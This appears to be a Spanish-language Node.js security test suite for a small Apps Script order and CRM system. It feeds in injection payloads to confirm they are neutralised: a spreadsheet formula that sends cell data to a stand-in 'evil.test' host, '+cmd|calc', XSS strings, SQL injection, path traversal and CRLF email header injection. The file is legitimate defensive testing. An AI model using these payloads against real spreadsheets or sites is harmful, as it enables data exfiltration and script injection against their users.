/* Pruebas de seguridad y de flujo del sistema de pedidos (apps-script/) en un simulador.
   Correr:  node pruebas/seguridad.test.js
   Cada prueba imprime ✓ o ✗. Termina con código 1 si alguna falla. */
const { cargar } = require('./simulador');

let fallas = 0, n = 0;
function prueba(nombre, fn) {
  n++;
  try { fn(); console.log('✓', nombre); } catch (e) { fallas++; console.log('✗', nombre, '\n   ', e.message); }
}
const ok = (c, msg) => { if (!c) throw new Error(msg || 'falló'); };
const formulas = filas => filas.flatMap(f => Object.entries(f).filter(([, v]) => v && typeof v === 'object' && 'FORMULA' in v).map(([k, v]) => `${k}=${v.FORMULA}`));

const JPG = 'data:image/jpeg;base64,' + Buffer.from('foto').toString('base64');
function pedido(sim, extra = {}) {
  return {
    token: sim.config('Token del sitio'), fillMs: 9000, website: '',
    customer: { name: 'Ana López', phone: '9876 5432', email: 'ana@correo.com', city: 'Tegucigalpa', date: '2026-11-20', notes: 'Fondo rosa' },
    items: [{ product: 'Cuadro con minifiguras', qty: 1, unitPrice: 750, discount: 0, total: 750, options: [['Marco', 'Blanco']], bom: [{ key: 'Figura · Cuerpo', qty: 2 }], preview: JPG }],
    total: 750, currency: 'HNL', ...extra,
  };
}
const nuevo = (o = {}) => cargar({ silencio: true, ...o });

// ---------- entrada de pedidos ----------
prueba('Pedido normal se guarda con ID y foto', () => {
  const s = nuevo(); const r = s.post(pedido(s));
  ok(r.ok && /^PEHN-\d{6}-001$/.test(r.id), JSON.stringify(r));
  const p = s.hoja('Pedidos'); ok(p.length === 1 && p[0].Cliente === 'Ana López');
  ok(s.hoja('Partidas').length === 1);
});

prueba('Token falso se rechaza', () => {
  const s = nuevo(); const r = s.post({ ...pedido(s), token: 'x' });
  ok(!r.ok && /Token/.test(r.error)); ok(s.hoja('Pedidos').length === 0);
});

prueba('Sin token se rechaza (aunque el sitio no tenga token configurado)', () => {
  const s = nuevo(); const b = pedido(s); delete b.token; ok(!s.post(b).ok);
});

prueba('Bot: campo trampa lleno', () => { const s = nuevo(); ok(!s.post(pedido(s, { website: 'http://spam' })).ok); });
prueba('Bot: llenado en menos de 2.5 s', () => { const s = nuevo(); ok(!s.post(pedido(s, { fillMs: 300 })).ok); });
prueba('Bot: sin tiempo de llenado', () => { const s = nuevo(); const b = pedido(s); delete b.fillMs; ok(!s.post(b).ok); });

prueba('JSON roto o no-objeto no truena', () => {
  const s = nuevo();
  ['{', 'null', '[]', '"hola"', '12'].forEach(b => ok(!s.post(b).ok, b));
});

prueba('Inyección de fórmulas: ningún texto del cliente queda como fórmula', () => {
  const s = nuevo();
  const malo = '=IMPORTXML("https://evil.test/?x="&A1;"//a")';
  const b = pedido(s, {
    customer: { name: malo, phone: '+504 9876-5432', email: 'a@b.co', city: '@SUM(A1)', date: '-1+1', notes: '+cmd|calc' },
    items: [{ product: '=HYPERLINK("http://evil")', qty: 1, total: 10, options: [['=1+1', '-2'], '@x'], bom: [{ key: '=A1', qty: 1 }] }],
  });
  ok(s.post(b).ok);
  ['Pedidos', 'Partidas', 'Clientes', 'Recetas'].forEach(h => { const f = formulas(s.hoja(h)); ok(!f.length, h + ': ' + f.join(' | ')); });
  ok(s.hoja('Pedidos')[0].Cliente.texto === malo, 'el texto se guarda tal cual, como texto');
});

prueba('Textos gigantes se recortan', () => {
  const s = nuevo();
  ok(s.post(pedido(s, { customer: { name: 'A'.repeat(5000), phone: '98765432', city: 'B'.repeat(5000), notes: 'C'.repeat(50000) } })).ok);
  const p = s.hoja('Pedidos')[0];
  ok(p.Cliente.length <= 80 && p.Ciudad.length <= 60 && p['Notas del cliente'].length <= 1000);
  ok(p.Datos.length < 50000, 'Datos cabe en una celda');
});

prueba('Saltos de línea en el nombre no llegan al asunto del correo', () => {
  const s = nuevo();
  ok(s.post(pedido(s, { customer: { name: 'Ana\r\nBcc: todos@x.com', phone: '98765432', city: 'X' } })).ok);
  ok(s.mails.every(m => !/[\r\n]/.test(m.subject)), s.mails.map(m => m.subject).join(' / '));
});

prueba('HTML en el nombre no se inyecta en el correo', () => {
  const s = nuevo();
  ok(s.post(pedido(s, { customer: { name: '<img src=x onerror=alert(1)>', phone: '98765432', city: 'X', email: 'a@b.co' } })).ok);
  ok(s.mails.every(m => !/<img src=x/.test(m.htmlBody)));
});

prueba('Cantidades y montos absurdos se acotan', () => {
  const s = nuevo();
  ok(s.post(pedido(s, { total: -500, items: [{ product: 'X', qty: 1e9, total: 'abc', options: 'no-es-lista' }] })).ok);
  const pa = s.hoja('Partidas')[0], pe = s.hoja('Pedidos')[0];
  ok(pa.Cantidad === 99 && pa.Total === 0 && pe.Total === 0, JSON.stringify([pa.Cantidad, pa.Total, pe.Total]));
});

prueba('SVG o tipos raros no se guardan como imagen', () => {
  const s = nuevo();
  const svg = 'data:image/svg+xml;base64,' + Buffer.from('<svg onload=alert(1)>').toString('base64');
  ok(s.post(pedido(s, { items: [{ product: 'X', qty: 1, total: 1, preview: svg, images: [svg, 'javascript:alert(1)'] }] })).ok);
  ok(!s.hoja('Partidas')[0]['Imágenes del cliente'], 'no debe guardar archivos');
});

prueba('Teléfono inválido o correo inválido', () => {
  const s = nuevo();
  ok(!s.post(pedido(s, { customer: { name: 'A', phone: '123', city: 'X' } })).ok);
  ok(!s.post(pedido(s, { customer: { name: 'A', phone: '98765432', city: 'X', email: 'no-es-correo' } })).ok);
});

prueba('Límite por WhatsApp: el 6.º pedido en 10 min se frena', () => {
  const s = nuevo();
  for (let i = 0; i < 5; i++) ok(s.post(pedido(s)).ok, 'pedido ' + (i + 1));
  ok(!s.post(pedido(s)).ok);
});

prueba('Límite global por hora frena inundación con números distintos', () => {
  const s = nuevo();
  let rech = 0;
  for (let i = 0; i < 50; i++) if (!s.post(pedido(s, { customer: { name: 'Bot', phone: '9' + String(1000000 + i), city: 'X' } })).ok) rech++;
  ok(rech === 10, 'rechazados ' + rech);
});

prueba('IDs no se repiten aunque se borre una fila', () => {
  const s = nuevo();
  s.post(pedido(s)); s.post(pedido(s, { customer: { name: 'B', phone: '99998888', city: 'X' } }));
  const sh = s.ctx.SpreadsheetApp.getActive().getSheetByName('Pedidos');
  sh._g.splice(1, 1); // borra el primer pedido
  const r = s.post(pedido(s, { customer: { name: 'C', phone: '97776666', city: 'X' } }));
  ok(r.id.endsWith('-003'), r.id);
});

// ---------- Mi pedido (seguimiento) ----------
prueba('Seguimiento con WhatsApp correcto devuelve solo estado y montos', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  const r = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '+504 9876-5432' });
  ok(r.ok, r.error);
  ok(r.pedido.anticipo === 375 && r.pedido.total === 750);
  const txt = JSON.stringify(r);
  ['Ana', 'ana@correo', 'Tegucigalpa', 'Fondo rosa'].forEach(x => ok(!txt.includes(x), 'filtra ' + x));
});

prueba('Seguimiento con WhatsApp ajeno da el mismo error que un pedido inexistente', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  const a = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '91112222' });
  const b = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id: 'PEHN-000000-999', phone: '98765432' });
  ok(!a.ok && !b.ok && a.error === b.error, a.error + ' / ' + b.error);
});

prueba('Seguimiento: adivinar a fuerza bruta se frena', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  let ultimo;
  for (let i = 0; i < 20; i++) ultimo = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '9' + String(1000000 + i) });
  ok(/intentos/.test(ultimo.error), ultimo.error);
});

prueba('Seguimiento: ID con caracteres raros se rechaza', () => {
  const s = nuevo();
  ["' OR 1=1 --", 'PEHN-"><script>', '../../etc', 'PEHN-*'].forEach(id => ok(!s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '98765432' }).ok, id));
});

// ---------- comprobantes ----------
prueba('Comprobante con monto correcto: "Coincide"', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  s.ctx.__ocr = 'BAC Credomatic\nTransferencia exitosa\n27/10/2026 14:22\nCuenta 1234 5678\nMonto: L 375.00\nReferencia 99812';
  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
  ok(r.ok && r.pago.resultado === 'Coincide' && r.pago.monto === 375, JSON.stringify(r));
  const pg = s.hoja('Pagos'); ok(pg.length === 1 && pg[0].Resultado === 'Coincide');
  const seg = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '98765432' });
  ok(seg.pedido.pagado === 375 && seg.pedido.porPagarAnticipo === 0 && seg.pedido.saldo === 375, JSON.stringify(seg.pedido));
});

prueba('Comprobante con otro monto: queda en revisión y no cuenta como pagado', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  s.ctx.__ocr = 'Pago realizado HNL 1,200.00';
  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
  ok(r.ok && r.pago.resultado === 'Revisión' && r.pago.monto === 1200, JSON.stringify(r));
  const seg = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '98765432' });
  ok(seg.pedido.pagado === 0);
});

prueba('Comprobante sin Drive API: se guarda y queda "Sin lectura"', () => {
  const s = nuevo({ ocr: false }); const { id } = s.post(pedido(s));
  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
  ok(r.ok && s.hoja('Pagos')[0].Resultado === 'Sin lectura');
});

prueba('Comprobante de pedido ajeno se rechaza', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  ok(!s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '91112222', file: JPG }).ok);
  ok(s.hoja('Pagos').length === 0);
});

prueba('Comprobante que no es imagen ni PDF se rechaza', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  const html = 'data:text/html;base64,' + Buffer.from('<script>').toString('base64');
  ok(!s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: html }).ok);
});

prueba('Texto del OCR con fórmulas no se vuelve fórmula', () => {
  const s = nuevo(); const { id } = s.post(pedido(s));
  s.ctx.__ocr = '=IMPORTDATA("http://evil") L 375';
  s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
  ok(!formulas(s.hoja('Pagos')).length);
});

prueba('Lectura de montos en formatos comunes', () => {
  const s = nuevo(), { montosEn_, elegirMonto_ } = s.x;
  const casos = [['Monto L 1,250.00', 1250, 1250], ['Lps. 625', 625, 625], ['HNL 1.250,50', 1250.5, 1250.5], ['Total: 375.00 fecha 27/10/2026', 375, 375], ['sin numeros', null, 100]];
  casos.forEach(([t, esperado, esp]) => { const m = elegirMonto_(montosEn_(t), esp); ok(m === esperado, `${t} -> ${m}`); });
});

// ---------- CRM ----------
prueba('CRM sin clave: sin acceso', () => {
  const s = nuevo();
  let err = ''; try { s.run('crm("mala", "datos", {})'); } catch (e) { err = e.message; }
  ok(/Sin acceso/.test(err), err);
});

prueba('CRM: no deja escribir en la fila de encabezados ni fuera de rango', () => {
  const s = nuevo(); s.post(pedido(s)); const k = s.config('Clave del CRM');
  [1, 0, -1, 999, '2; DROP', 2.5].forEach(row => {
    let err = ''; try { s.run(`crm(${JSON.stringify(k)}, "nota", ${JSON.stringify({ row, texto: 'x' })})`); } catch (e) { err = e.message; }
    ok(/Fila inválida/.test(err), 'fila ' + row + ': ' + err);
  });
  ok(s.hoja('Pedidos').length === 1);
});

prueba('CRM: notas y etiquetas con fórmulas quedan como texto', () => {
  const s = nuevo(); s.post(pedido(s)); const k = JSON.stringify(s.config('Clave del CRM'));
  s.run(`crm(${k}, "nota", { row: 2, texto: '=1+1' })`);
  s.run(`crm(${k}, "cliente", { row: 0, tel: '50433334444', nombre: '=X', etiquetas: '+vip', notas: '@a' })`);
  s.run(`crm(${k}, "pieza", { sku: 'nuevo', pieza: '=HYPERLINK(1)', stock: 3 })`);
  ['Pedidos', 'Clientes', 'Inventario', 'Movimientos'].forEach(h => ok(!formulas(s.hoja(h)).length, h + ': ' + formulas(s.hoja(h))));
});

prueba('CRM: confirmar un pago lo suma como pagado', () => {
  const s = nuevo(); const { id } = s.post(pedido(s)); const k = JSON.stringify(s.config('Clave del CRM'));
  s.ctx.__ocr = 'algo raro';
  s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
  s.run(`crm(${k}, "pago", { row: 2, resultado: 'Confirmado', monto: 375 })`);
  const seg = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '98765432' });
  ok(seg.pedido.pagado === 375, JSON.stringify(seg.pedido));
  let err = ''; try { s.run(`crm(${k}, "pago", { row: 2, resultado: 'Hackeado' })`); } catch (e) { err = e.message; }
  ok(/inválido/.test(err));
});

// ---------- contenido del sitio ----------
prueba('API pública del sitio solo entrega textos y colores, nunca pedidos', () => {
  const s = nuevo(); s.post(pedido(s));
  const r = s.get({ api: 'sitio' });
  ok(r.ok && r.sitio['color.marca'] === '#F08A1C' && r.sitio['hero.titulo'], JSON.stringify(r).slice(0, 200));
  const t = JSON.stringify(r); ['Ana', 'ana@correo', '98765432', 'Token', 'Clave'].forEach(x => ok(!t.includes(x), 'filtra ' + x));
});

prueba('Sin clave, ?k= vacío no abre el CRM', () => {
  const s = nuevo(); const h = s.ctx.doGet({ parameter: {} }).getContent(); ok(/no tiene acceso/.test(h));
});

prueba('Guardar sitio: valida colores, enlaces, fotos y WhatsApp', () => {
  const s = nuevo(); const k = JSON.stringify(s.config('Clave del CRM'));
  s.run(`crm(${k}, "sitio", { cambios: [{ clave: 'color.marca', valor: '#112233' }, { clave: 'hero.titulo', valor: '<script>alert(1)</script>' }, { clave: 'contacto.whatsapp', valor: '+504 9876-5432' }] })`);
  const r = s.get({ api: 'sitio' }).sitio;
  ok(r['color.marca'] === '#112233' && r['contacto.whatsapp'] === '50498765432');
  ok(r['hero.titulo'] === '<script>alert(1)</script>', 'el texto se guarda tal cual; el sitio lo pinta como texto, no como HTML');
  [['color.marca', 'red;background:url(x)'], ['hero.foto', 'javascript:alert(1)'], ['hero.foto', 'https://evil.com/x.jpg'], ['contacto.instagram', 'javascript:alert(1)'], ['contacto.whatsapp', '12'], ['no.existe', 'x']].forEach(([clave, valor]) => {
    let err = ''; try { s.run(`crm(${k}, "sitio", { cambios: [${JSON.stringify({ clave, valor })}] })`); } catch (e) { err = e.message; }
    ok(/No se guardaron/.test(err), clave + ' = ' + valor + ' debió rechazarse');
  });
  ok(s.get({ api: 'sitio' }).sitio['color.marca'] === '#112233', 'lo inválido no pisó lo bueno');
});

prueba('Texto del sitio con fórmula queda como texto en la hoja', () => {
  const s = nuevo(); const k = JSON.stringify(s.config('Clave del CRM'));
  s.run(`crm(${k}, "sitio", { cambios: [{ clave: 'anuncio', valor: '=IMPORTXML("http://x";"//a")' }] })`);
  ok(!formulas(s.hoja('Sitio')).length);
});

prueba('Revisión del sistema corre sin romperse', () => {
  const s = nuevo(); const t = s.run('revisarSistema()'); ok(/Hoja Pedidos/.test(t), t);
});

console.log(`\n${n - fallas} de ${n} pruebas pasaron.`);
process.exit(fallas ? 1 : 0);
